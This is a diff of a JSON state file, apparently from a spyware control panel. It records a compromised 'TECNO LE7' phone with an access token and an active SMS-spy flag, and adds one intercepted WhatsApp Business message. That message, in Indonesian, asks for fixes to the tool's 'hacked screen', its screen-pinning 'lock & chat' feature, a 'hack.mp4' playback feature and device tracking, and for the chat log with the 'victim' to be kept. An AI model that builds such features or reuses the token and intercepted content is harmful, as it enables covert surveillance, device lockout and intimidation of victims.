@@ -68,7 +68,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2b39a6703f5db8211dfa9f9423390eb5",
-    "lastSeen": 1776619026203,
+    "lastSeen": 1776619029225,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-19T17:08:10.865Z",
@@ -84,6 +84,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "Call Me Zal7Sex",
+        "content": "bantu gw fix dan ubahin pada file ini\n1. di hacked screen tepat nya fitur lock & chat itu pas mau kirim pesan itu tombol kirim nya ga bisa di pencet\n2. fitur play video itu sekarang ga usah upload video melainkan video udah tersedia di assest/video/hack.mp4 bersama video background.mp4\n3. overlay lock pada fitur lock & chat itu jangan reset overlay atau ngasih accessibility, dia hanya pake pinning screen atau sematkan aplikasi saja untuk lock & chat\n4. perbaiki device offline dan online, contoh hp Tecno udah connect terus offline nah terus connect lagi tuh jadi jangan daftar in sebagai online baru melainkan yg sebelumnya Offline jadi Online \n5. di hacked screen Kalo device udah pernah ke lock melalui fitur lock & chat itu log chatan sama victim tetep ada jangan ilang",
+        "time": "20/04 00:17",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776619030703
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
